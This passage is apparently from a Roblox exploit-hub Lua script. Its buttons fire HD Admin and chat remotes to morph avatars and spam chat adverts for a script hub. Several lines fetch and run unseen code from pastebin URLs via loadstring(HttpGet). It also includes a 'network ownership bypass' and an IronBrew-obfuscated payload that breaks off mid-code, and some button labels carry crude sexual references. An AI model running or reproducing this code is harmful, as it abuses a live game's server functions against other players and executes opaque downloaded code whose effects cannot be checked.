i=h.Backpack:GetChildren()i[1].Grip=CFrame.new(-1.300,1.506,-1.600)*CFrame.Angles(4.7,math.rad(-90),0,1-1)i[1].Parent=h.Character;loadstring(game:HttpGet('https://pastebin.com/raw/jR00xfMW'))()end)f.Parent=b;f.BackgroundColor3=Color3.fromRGB(255,85,0)f.Position=UDim2.new(0.0816326514,0,0.614864886,0)f.Size=UDim2.new(0,123,0,27)f.Font=Enum.Font.SourceSans;f.Text="refresh"f.TextColor3=Color3.fromRGB(0,0,0)f.TextScaled=true;f.TextSize=14.000;f.TextWrapped=true;f.MouseButton1Down:connect(function()local g={[1]=";re "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))end)
end)
Section7:NewButton("clothes code 18 coming soon auto", "9543531812,9537661006,20011897", function()
    
end)
Section7:NewButton("pp ", "auto transform coming soon", function()
    
local a=Instance.new("ScreenGui")local b=Instance.new("Frame")local c=Instance.new("TextLabel")local d=Instance.new("TextLabel")local e=Instance.new("TextButton")local f=Instance.new("TextButton")a.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")a.ResetOnSpawn=false;b.Parent=a;b.BackgroundColor3=Color3.fromRGB(84,84,84)b.Position=UDim2.new(0.0540156364,0,0.424724609,0)b.Size=UDim2.new(0,147,0,148)b.Active=true;b.Draggable=true;c.Parent=b;c.BackgroundColor3=Color3.fromRGB(255,85,0)c.Position=UDim2.new(0,0,0.873928785,0)c.Size=UDim2.new(0,147,0,18)c.Font=Enum.Font.SourceSans;c.Text="theshadow24124"c.TextColor3=Color3.fromRGB(0,0,0)c.TextSize=17.000;d.Parent=b;d.BackgroundColor3=Color3.fromRGB(255,85,0)d.Size=UDim2.new(0,147,0,24)d.Font=Enum.Font.SourceSans;d.Text="PP خبزه"d.TextColor3=Color3.fromRGB(0,0,0)d.TextScaled=true;d.TextSize=14.000;d.TextWrapped=true;e.Parent=b;e.BackgroundColor3=Color3.fromRGB(255,85,0)e.Position=UDim2.new(0.0816326514,0,0.270270258,0)e.Size=UDim2.new(0,123,0,27)e.Font=Enum.Font.SourceSans;e.Text="PP"e.TextColor3=Color3.fromRGB(0,0,0)e.TextScaled=true;e.TextSize=20.000;e.TextWrapped=true;e.MouseButton1Down:connect(function()local g={[1]=";morph me DonaldTrump "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))local g={[1]=";morph me noob1 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))local g={[1]=";char me 4034224714 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))wait(1)local g={[1]=";hat me 4794106130 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))wait(.1)loadstring(game:HttpGet('https://pastebin.com/raw/jR00xfMW'))()wait(.1)loadstring(game:HttpGet('https://pastebin.com/raw/4LcD1a5U'))()wait(.1)loadstring(game:HttpGet('https://pastebin.com/raw/u2AjuwWn'))()local h=game:GetService("Players").LocalPlayer;h.Character.Humanoid:UnequipTools()local i=h.Backpack:GetChildren()i[1].Grip=CFrame.new(-1.300,1.506,-1.600)*CFrame.Angles(4.7,math.rad(-90),0,1-1)i[1].Parent=h.Character;loadstring(game:HttpGet('https://pastebin.com/raw/jR00xfMW'))()end)f.Parent=b;f.BackgroundColor3=Color3.fromRGB(255,85,0)f.Position=UDim2.new(0.0816326514,0,0.614864886,0)f.Size=UDim2.new(0,123,0,27)f.Font=Enum.Font.SourceSans;f.Text="refresh"f.TextColor3=Color3.fromRGB(0,0,0)f.TextScaled=true;f.TextSize=14.000;f.TextWrapped=true;f.MouseButton1Down:connect(function()local g={[1]=";re "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(g))end)

end)
Section7:NewButton("BIG & small T I T IN inter hub + hat hub", "in scriptfe - scripts - inter hub + hat hub", function()
            local args = {
    [1] = "in scriptfe-scripts-i n t e r hub + hat hub",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("z-b-e IN inter hub + hat hub", "in scriptfe-scripts- inter hub", function()
            local args = {
    [1] = "in scriptfe-scripts-i n t e r hub",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("big t-i-t", "r6 , hat", function()
     
end)
Section7:NewButton("control pp", "r6 , hat", function()
     
end)
Section7:NewButton("control pp", "r6 , hat", function()
     
end)
Section7:NewButton("z-b-e", "3398308134,3409612660,3822880197,4047554959,4584029953,3443038622,3656493304,3940375351,3033908130,4154538250", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
game["Run Service"].RenderStepped:connect(function()
   settings().Physics.AllowSleep = false
   setsimulationradius(math.huge*math.huge,math.huge*math.huge)
end)
 
print("Loaded Network Ownership Bypass!")
 
--[[
IronBrew:tm: obfuscation; Version 2.7.2
]]
return(function(ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIIllIIIIIllIlIlllllII)local ajefa_IIIlIlIlIlIllIIllIIIIlII=string.char;local ajefa_IlIIllIIIl=string.sub;local ajefa_lllIlllllIIlI=table.concat;local ajefa_IIIlIllIlIllII=math.ldexp;local ajefa_lIlIllIlIlIlIIIlIllIllI=getfenv or function()return _ENV end;local ajefa_lllIIllIIIIIlllIlllllII=select;local ajefa_IlIIIlIIIIlIIlllI=unpack or table.unpack;local ajefa_lIIIllIlIIIIIllIlII=tonumber;local function ajefa_llIIllIIIIlI(ajefa_IllIllll)local ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lIlllIll,ajefa_IlIIIlIIIIlIIlllI="","",{}local ajefa_IIIlIllIllllIIllIlllIIll=256;local ajefa_lIIllIlIIlllII={}for ajefa_lllIIlIllIlIllllIIlIIlll=0,ajefa_IIIlIllIllllIIllIlllIIll-1 do ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IIIlIlIlIlIllIIllIIIIlII(ajefa_lllIIlIllIlIllllIIlIIlll)end;local ajefa_lllIIlIllIlIllllIIlIIlll=1;local function ajefa_lIIIIIlIllIlllllllIIll()local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIIllIlIIIIIllIlII(ajefa_IlIIllIIIl(ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll),36)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+1;local ajefa_lIlllIll=ajefa_lIIIllIlIIIIIllIlII(ajefa_IlIIllIIIl(ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll-1),36)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll;return ajefa_lIlllIll end;ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IIIlIlIlIlIllIIllIIIIlII(ajefa_lIIIIIlIllIlllllllIIll())ajefa_IlIIIlIIIIlIIlllI[1]=ajefa_IlIIIlIllIlIlllIlIlIllll;while ajefa_lllIIlIllIlIllllIIlIIlll<#ajefa_IllIllll do local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIIIIlIllIlllllllIIll()if ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll]then ajefa_lIlllIll=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll]else ajefa_lIlllIll=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_IlIIllIIIl(ajefa_IlIIIlIllIlIlllIlIlIllll,1,1)end;ajefa_lIIllIlIIlllII[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_IlIIllIIIl(ajefa_lIlllIll,1,1)ajefa_IlIIIlIIIIlIIlllI[#ajefa_IlIIIlIIIIlIIlllI+1],ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll,ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1 end;return table.concat(ajefa_IlIIIlIIIIlIIlllI)end;local ajefa_lIIIIIlIllIlllllllIIll=ajefa_llIIllIIIIlI('26523S27523T23L27523S26J26F26Y26F27127026926E26L23T23Y27926J26Y26L26H27027J27L27527O26Z27126D27J23W27927326H26927023V27927923C25323T28027526N26H27Y23T23Z27926026C26H26P26L26Y26Z23T23N27925G26F26J26H26C28K28M28O23T23K27925R26L27025H27E26Z26L28628723S24425K28H27M27E26E27R26Y29C29D23S23T23X27926W28328P27727925N26826H26Y26H26J29L28R29429629Y26926C26K27O26E29N28729G29N25D26Z25L29W27525L26J26J26L26Z26Z27C26P27K27925C26H26E26K26C27J24D27925Q27H26K2B528P2702A82AA25J26M25N28L2AR2A527526326W26L26J26928X25H2AQ2682AV2752BQ26Z26825D26K23T24F27926Y26I26O26H2AR29626926K24Y24N24N2572542CE25925825A2CF25A2C02C22C42C629A27G2CA2CC25825824W24X25625725625B2CH2CM27U2CO2C72CR2CB24N2582552CH25825B2DD2582592D323S2C32C52D62C92D825825424X2CV25A2DD25925729H27525O2AQ27027D2AU23M29X2AY25N26F26C26C2C926L23U29P23P2792AN2AP2AR2AT26726L2AA23T24029X27126Z27026F26D26026826P26Z26928W28Y27D2BL26Y27G2AQ23T24A28J2EX2EZ2F12602F328O2F628Q29N27I27323V1I1H2FO2FO21D28A28C23S25I28F27J29N2AX27029227925D26E2ES2AY2AP23T2E42AM2702702A226827Y29K28B2AW27Q2552DX23S2AX2AZ2B12GK29327526026F2EZ27G26F26E2GL2662BM2ET26Y2572AE27522W2FS2GI2702562GL2GN2B026L2HB29R27526427C2AS23V23I24G25W1722223H22W21J2H523S2342HU29O2HT2HM2HO2HQ2HS28A24C27925M28X26C26328V26B2A72GX2ES2A127H2G028S2GA2GC26J2GE26L29K2542BI23S25L2GB2GD2GF2702GK2EF27525G26926D28426Z25P26E26H26I2B126K23U23T23T24927925H26H26O25Q26Y2F02GW26E2HJ26Y26X27127J2F92HI2732692ES2J22J42702J62J82JA26L2BZ2G923S26526W2F425L26E26N2B12HV23K29G23R2792642JX2JZ26F27328O2KD2KF29B29D22026222023T2KK2JW2JY2702KA2KC2KE2KG29D1825V2KY2FT2FZ2DW28I2752HD2B12H429O23C2HY29D2642202H525K26G2LB2H92582HC2AY2HE2582FM2FP2FO2292532HV24S25K2M52LT2LG27Q2DH2LF2GM2LX2B12DH2LC27Q2CL2MD2LH26L2CL2MI27025B2LW2GO26L2MR2MP24W2MS2HE2MX2MP24X2MY2B12N22MD25F26L26P25O2KP2GY2MD27B26E27I2A32682ED23S24A25927923T27924O24P29D2ED23U25629P29O2432792NT2NK2762NW27524O2O22NO2AE2NJ29O2NO2ED2NO2JV2NO2FT2JV2ED2HH2872OB2NW2OE23S27T23S2O52NW2NO28I2NQ2OS23S29324O25523S2OC23S2782NZ2P12P62792H52JV2802K82JV29R23O2792PD23S2IK2O123S29R2J02PK27L2OP2OR2PP23S2OU2752PS2OY2NR2PS23Q2OQ25U2OO2Q32L02452Q32MD23S25J2PL27928I23W25B2792682OM2NM2E42PJ24O25K2PI23S2802482OO2EF2E42QH2NO28S2QE2QG2NW24O2Q22E42782JG24A2PE2PK27524Z23S2E42PF2ED23Y25S2RB23S24V2OW2QY2752RJ2OF2QF2752QV2OQ2NR2R323S24B2OQ25F2RH2E42I62JV2PF2B329D2RC2P62OR2E42E424E23S24U2752E424N2NW2C12RL23S2SG2RO27925P2R02RT2P32RV2RX2RZ23S2S12752S329O2S62ED2S82RH2SB2SD2RH2QF2NO2EP2SJ2T72QP2RP23S2SO2NO2OV2RU2RW24O28I2S92SV2PK2SY2S523S2RD2OQ2SE2T32SC2TU2TF23S2412TC2SN2SP2RH2782TJ2RY2TM2SW2TR23S2S42872T02TT2SU2T42TU2RR2422U12RQ2QI2RH2QL2862TM29R2JV2QK2NP2TU2U52UF2U82TO2UB2SZ2UA2T12TU2E42NY2792E42P22T22UX2542TU24423S2Q62TH2SR2TJ2RJ2TM2462UY2RH2V72TU2VA2UW2SS2JV28S2OR2UF28S28S2NR2S22UA2752JV2EF24Q2PG2752Q02OJ2JV2KK2WB29R2QR2OJ23S2522QO2QR2ED2QR2RH2472QO2UT23S24S2W82QO2PJ2V82UO23S2WN27824R2RH2VB2VU27528S2RW2W42SX2QO29D2VZ2UA2482642RH2X22QX2TD2RR23Y2F929R2Q62OL2SJ2XP2NK2NM29R2OG2EP27L2W729D29R2P22PH24T2UV2QB29R2W12PV2TW2X92PT2Q32O427528I2YG2UF2YH2OY2YF2YC2Q02OR2YH2RJ2YO2YC24G28729R28I2ED2JV27L24I2Y52PS2Y82YC2PF2YB29324J2WU2782Z528727L2782WM27529R24H2Q32YY23S2Y42YE2Q327L2Z328I2T52PK2932PQ2752932932PU2OX31002YK310123S2YN2ZW310024K2UF2ZX23S24L2ZC31002YX2YL2Z02ZN2YH2Z32932ZB2JV2782Z82YB2S629D2TL2P62WN27L2ZI28I2JV28I2ZM2YI2YC310K2YA2PK2782ZV2SR2782ZZ2782783102311C31042UF311F24M28728I2ZE2ZT23S310H310931002Z32782SG310Q23S2VD2YB28S2P029D29328S2ZF2YC2ZI2932JV29331112OR310A311S31152WR31182TM2ZZ2TM31022TM31052SU311J2792932V93116311O2Y5311F2Z32E42NV311Y311W2WU2PF31202872ZA310U31062ZI278310N2ZL312U2SR312W23S2572WU28S31182XD2ZZ2XD31022XD312M2XD2YQ2X62QO2YT27927831232WZ2752782582QB2X023S2NM28I25425D2SR25A23S2QF2542W727824W313Y311X27824X314B31302SR24Y23S2RA314I23S25023S251314M2782WJ2532PK2E4312A2V523S2Z328S313G2YB2PF31182PF2PF2ZZ315B31002OR315E312M315E3108315G2UA310C2WX2TS2WN2E4314127L315Q31443100311X2E4314A314C2TU314G2QR315X23S314K31602RH314O314Q2TU314T314V3164314Y2PK28S31522WV31542V02ZS2W52YD2UF2EF2EF2ZZ316Q315F275316T312M316T2QN2OR316T25L28728S2EF310F2UA311P315L2PF2Z32EF310M2W923S310P2PK2KK2ZB2792PF2KK312428S2ZI2PF2W2316I315E317B312E317E31182Q02Q02ZZ317Y316U311G31812OR3181316Z317E2Q03172317K311G31762EF3178316V23S2EF2Z32Q0317D23S2KK31332JV2QR317J318G2WL313Y2UA2ZI2EF316N316I316T318J317V318M316O2OR2KK2KK2ZZ319631823199312M3199312O318G317M2PK2Q0318F3183316K2WC2W32PK2QR25M2WU2JG31332792Q02JG31242EF2ZI2Q02JV2Q0316I31812Z32KK3157319O31942752QR2QR2ZZ31AB318231AE2YN2NR31AE316Z310831AE318A317E318T2WN2Q0314128S31AQ315V2EF311X2Q0315Z314M2Q0316231B03165314L31AX23S314O2PF31B6314T25N31B32WJ25O317H313B2ZN31992Z32QR316M2752JG31182JG2JG2ZZ31BQ318231BT312M31BT2SO2OR31BT25Q2872KK319W31A8319J31AE2Z32JG318L2F925R2WU2RW318R313Y2RW31242KK2ZI2QR318P31BH2UF31C72PK2JG31BM2O131182F92F92ZZ31CV318231CY312M31CY31BY2X92F931C127931CL2P62JV2JG319J31BT2Z32F9318L2RW318O2752I631CF2JG2I631242QR2ZI2R531BN31CN31BZ23S2JG31DE313F31CD31A92SS2RW2ZZ2RW2RW310231E4311G2OR31E731D331E123S31D631DS31CH318U2JG31412KK2WN2JG2NM31B931DS31AZ311X2JG31B231ER31B431672JG31B8314M2JG314T25C31EZ2WI23S31482JV2F9316I31CY2Z32RW31CS2I631182I62I62ZZ31FG318231FJ312M31FJ25E2UF31FJ2RY2W831DN2PK2RW319J31E72Z331DK2WU2B331CC2YB2SB31CF2RW2SB31242F92ZI2RW2JV2RW312A2NR31FX2NK2742I631CS2B331182B32B32ZZ31GN318231GQ312M31GQ31FO2OR31GQ31FR2752RW2B331762I6319J31FJ2Z32B3318L2SB31DI23S2C131CF2I62C131242RW2ZI2U92I6316I31H52PK2B331A72JV2SB31182SB2SB2ZZ31HT318231HW312M31HW31GV27531HW31GY2TN31G7318U2I631412F92WN2I62NM316331DJ23S31EQ31IF31ET31IF3166314M2I631EY311X2I631F131IM31F431F62752B3316I31GQ2Z32UH2YB2C131182C12C12ZZ31J4318231J7312M31J725G2UF31J725H2872B331HF2PK2SB319J31HW2Z331HC2WU2EP31G22PK2U031CF2SB2U031242B32ZI2SB31HQ31DT31I223S2SB31JN31922XX2Y52EP2EP2ZZ31KA318231KD312M31KD31JC2OR31KD31JF2792SB2EP31762C1319J31J72Z32EP318L2U031HA2UK31CF2C12UK31242SB2ZI2C12JV2C1316I31KS2PK2EP31HP2752U031182U02U02ZZ31LG318231LJ312M31LJ31KI31LD2TZ23S31KL2752C131JW318U2C131412B32WN2C12NM2RW311X2C131EQ31482C131ET2ED2C131IL31M431B72UA31MD31IR31MD2WJ31IU23S2EP316I31KD2Z32U031CS2UK31182UK2UK2ZZ31MU318231MX312M31MX25I2UF31MX2QA2792EP31L131JS312T2ZN31LJ2Z331KY2WU2NY31JR2JV2VF31CF2U02VF31242EP2ZI2U02JV2U0316I31NC2PK2UK31CS2NY31182NY2NY2ZZ31O0318231O3312M31O331N22OR31O331N531LP2NY31762UK319J31MX2Z32NY318L2VF31HA2Q631CF2UK2Q631242U02ZI2UK2JV31MS2Y531MX31MW23S2UK310231MZ31N331P02FU31P42UK2QA311X2UK2VF2QF31OV31K231P52UK31OI31DY2YB2VF31182VF2VF2ZZ31PN318231PQ312M31PQ31O827531PQ31OB31P531NM318U2UK31412EP2WN2UK2NM2SB31PA31IG31B52752UK31IJ31P531MC31QC31ME31EO31P531MH31QH31MJ2PK2NY316I31O32Z32VF31CS2Q631182Q62Q62ZZ31QX318231R0312M31R02602UF31R02612872NY31OQ2PK2VF319J31PQ2Z331ON2WU2VN31NH2752WP31CF2VF2WP31242NY2ZI2VF2NL29E31DT28S31RF2PK2Q631CS2VN31182VN2VN2ZZ31S4318231S7312M31S731R52OR31S731R82792VF2VN31762Q6319J31R02Z32VN318L2WP31HA2O531CF2VH313631RV2ZI2Q62JV2Q6316I31SM2PK2VN31LC23S2WP31182WP2WP2ZZ31T9318231TC312M31TC31SC31RL31T623S31SF2752Q631RP318U2Q631412NY2WN2Q62NM2U0311X2Q631IH2VG23S31QE2Q631QG31U031IO31TM314S2GM314M2Q631QN2JV2VN316I31S72Z32WP31CS2O531182O52O52ZZ31UM318231UP312M31UP2622UF31UP2632872VN2O531762WP319J31TC2Z331SS2WU2NR31RK23S2W731CF2WP2W731242VN2ZI2WP2JV2WP316I31V42PK2O531CS2PY2Y52NR2NR2ZZ31VS318231VV312M31VV31UU2OR31VV31UX2792WP2NR31762O5319J31UP2Z32NR318L2W731HA2X231CF2O52X231242WP2ZI2O52JV31UK2Y531UP31UO2TT310231UR31UV2TT31W02YE2O531UX311X2O531PC31VN31PF31WA2PK2NR31T52W731182W72W72OU26631VA31XH310231XD31E827531XK31WY31XH2W731W32YE31VE318U2O531412VN2WN2O52NM2VF31X231QA31672O531QE2O531MC31482O531IO31Y931U831F231472TT31QN2OV31W623S2XG2R1316K2NR27423Y2ZI2X22NO2NO27T31UU2752AE31YW2SR27931YZ2K823S31YZ2Q031Z12792JG31Z731IF312P316K31YS275314O2O22752O92I62762GR23S2CQ27G2KE28Q2MD2EW2EY2F028Q2K825L2E92KP2632B126L26W2OC2FT28E28G2K829527026328O2722F027J2K826227126E320C26Y320E2G72PN2622IP26K28O26327R2KB2K62GH2752672832G031ZS28L28N29V2PJ320A2BB2AB2IP2HV2892IS28U2FD32142912C12BU2JJ2J327X263321M28L2JO26226H26K2692ER2M02M12FR23T2WN23S321O26D271321Q2692GX321S321U321W29O2762FT26D27Q2BS29N26W2KP320Y23S26827126N26L2RA2W42NM31ZH31K32O22T12NR2872ED31YF31YX2QP2XT2792OJ24O314T310D2OH2YC322C2O02VX31ZC323E313Z29O2Y22YU2Y5323931ZI2RH323C2S729O2WW323N31762NO31CF2O92YB2862ZB28C2NO2NR2NO317F2QB27528024A31FE32462UF2PS27L3128323O310D2932V42ZO318H2YD29R2VN31YU2UL23S324O324Q2O52NO31YF29R2Q02KK324W313Y2JG23W2VD2NO2B32OD2NM2NO32362KK31YT2ZJ323231Z32O2286324J325C318X323N2JV2UF2O031GB3232325M2OR2862862U932482Y528028031ZK323N28031242NO2Q0323U324B2OR325C324E325E2OA23S325H2UF325J2PK3176325N2P62U9286325R3232325U322Z2P62862WN2NO318T2FT3233324431ZG2O329O31Z629P324423S2722OC2L031YK2KN27028U2KQ26Y2KS2L72AF2652LP2L82LA2KZ2KL327A2L42KR2L62KU29D25Y327J29D24S327V28724M2202JD2H52KW327Y2KL328523S2LR32872WS25K313324U2FT2U0325C2SJ328G2O629D24U324U2Q32XQ2TD27L2SM31LP3244325C32742542SL326D32332NN2P7314M2O73290325G279311X32942WH329427532982Q72OK3295329D28631ZM2NW2FT329D2ZD329F2OJ329H31003291329P2O2329N329132743291287326W32542SC329L2RK2TD32A12OW287328E2NW32A12E42SJ32A6328V32972SD32942WW2OL329C329632AJ328Z32AL2NW323Z329F29N329M324L329132A332AQ311G32AW3297329U329R2O2329T32AY32722NW32B5324P329J329X329F29D326Z32BC2O2');local ajefa_lllIIlIllIlIllllIIlIIlll=(bit or bit32);local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll and ajefa_lllIIlIllIlIllllIIlIIlll.bxor or function(ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIlllIll)local ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lIIllIlIIlllII,ajefa_IlIIllIIIl=1,0,10 while ajefa_lllIIlIllIlIllllIIlIIlll>0 and ajefa_lIlllIll>0 do local ajefa_IlIIllIIIl,ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll%2,ajefa_lIlllIll%2 if ajefa_IlIIllIIIl~=ajefa_IIIlIllIllllIIllIlllIIll then ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII+ajefa_IlIIIlIllIlIlllIlIlIllll end ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll=(ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_IlIIllIIIl)/2,(ajefa_lIlllIll-ajefa_IIIlIllIllllIIllIlllIIll)/2,ajefa_IlIIIlIllIlIlllIlIlIllll*2 end if ajefa_lllIIlIllIlIllllIIlIIlll<ajefa_lIlllIll then ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIlllIll end while ajefa_lllIIlIllIlIllllIIlIIlll>0 do local ajefa_lIlllIll=ajefa_lllIIlIllIlIllllIIlIIlll%2 if ajefa_lIlllIll>0 then ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII+ajefa_IlIIIlIllIlIlllIlIlIllll end ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll=(ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_lIlllIll)/2,ajefa_IlIIIlIllIlIlllIlIlIllll*2 end return ajefa_lIIllIlIIlllII end local function ajefa_lIlllIll(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll)if ajefa_IlIIIlIllIlIlllIlIlIllll then local ajefa_lllIIlIllIlIllllIIlIIlll=(ajefa_lIlllIll/2^(ajefa_lllIIlIllIlIllllIIlIIlll-1))%2^((ajefa_IlIIIlIllIlIlllIlIlIllll-1)-(ajefa_lllIIlIllIlIllllIIlIIlll-1)+1);return ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_lllIIlIllIlIllllIIlIIlll%1;else local ajefa_lllIIlIllIlIllllIIlIIlll=2^(ajefa_lllIIlIllIlIllllIIlIIlll-1);return(ajefa_lIlllIll%(ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_lllIIlIllIlIllllIIlIIlll)>=ajefa_lllIIlIllIlIllllIIlIIlll)and 1 or 0;end;end;local ajefa_lllIIlIllIlIllllIIlIIlll=1;local function ajefa_IlIIIlIllIlIlllIlIlIllll()local ajefa_IlIIllIIIl,ajefa_IIIlIllIllllIIllIlllIIll,ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IllIllll(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+3);ajefa_IlIIllIIIl=ajefa_lIIllIlIIlllII(ajefa_IlIIllIIIl,136)ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIIllIlIIlllII(ajefa_IIIlIllIllllIIllIlllIIll,136)ajefa_lIlllIll=ajefa_lIIllIlIIlllII(ajefa_lIlllIll,136)ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIllIlIIlllII(ajefa_IlIIIlIllIlIlllIlIlIllll,136)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+4;return(ajefa_IlIIIlIllIlIlllIlIlIllll*16777216)+(ajefa_lIlllIll*65536)+(ajefa_IIIlIllIllllIIllIlllIIll*256)+ajefa_IlIIllIIIl;end;local function ajefa_lIIIllIlIIIIIllIlII()local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIllIlIIlllII(ajefa_IllIllll(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll),136);ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+1;return ajefa_IlIIIlIllIlIlllIlIlIllll;end;local function ajefa_IIIlIllIllllIIllIlllIIll()local ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lIlllIll=ajefa_IllIllll(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+2);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIllIlIIlllII(ajefa_IlIIIlIllIlIlllIlIlIllll,136)ajefa_lIlllIll=ajefa_lIIllIlIIlllII(ajefa_lIlllIll,136)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+2;return(ajefa_lIlllIll*256)+ajefa_IlIIIlIllIlIlllIlIlIllll;end;local function ajefa_llIIllIIIIlI()local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll();local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll();local ajefa_IlIIllIIIl=1;local ajefa_lIIllIlIIlllII=(ajefa_lIlllIll(ajefa_IlIIIlIllIlIlllIlIlIllll,1,20)*(2^32))+ajefa_lllIIlIllIlIllllIIlIIlll;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIlllIll(ajefa_IlIIIlIllIlIlllIlIlIllll,21,31);local ajefa_IlIIIlIllIlIlllIlIlIllll=((-1)^ajefa_lIlllIll(ajefa_IlIIIlIllIlIlllIlIlIllll,32));if(ajefa_lllIIlIllIlIllllIIlIIlll==0)then if(ajefa_lIIllIlIIlllII==0)then return ajefa_IlIIIlIllIlIlllIlIlIllll*0;else ajefa_lllIIlIllIlIllllIIlIIlll=1;ajefa_IlIIllIIIl=0;end;elseif(ajefa_lllIIlIllIlIllllIIlIIlll==2047)then return(ajefa_lIIllIlIIlllII==0)and(ajefa_IlIIIlIllIlIlllIlIlIllll*(1/0))or(ajefa_IlIIIlIllIlIlllIlIlIllll*(0/0));end;return ajefa_IIIlIllIlIllII(ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll-1023)*(ajefa_IlIIllIIIl+(ajefa_lIIllIlIIlllII/(2^52)));end;local ajefa_IIIlIllIlIllII=ajefa_IlIIIlIllIlIlllIlIlIllll;local function ajefa_IIIIllIIlllll(ajefa_IlIIIlIllIlIlllIlIlIllll)local ajefa_lIlllIll;if(not ajefa_IlIIIlIllIlIlllIlIlIllll)then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IIIlIllIlIllII();if(ajefa_IlIIIlIllIlIlllIlIlIllll==0)then return'';end;end;ajefa_lIlllIll=ajefa_IlIIllIIIl(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll-1);ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll;local ajefa_IlIIIlIllIlIlllIlIlIllll={}for ajefa_lllIIlIllIlIllllIIlIIlll=1,#ajefa_lIlllIll do ajefa_IlIIIlIllIlIlllIlIlIllll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IIIlIlIlIlIllIIllIIIIlII(ajefa_lIIllIlIIlllII(ajefa_IllIllll(ajefa_IlIIllIIIl(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll)),136))end return ajefa_lllIlllllIIlI(ajefa_IlIIIlIllIlIlllIlIlIllll);end;local 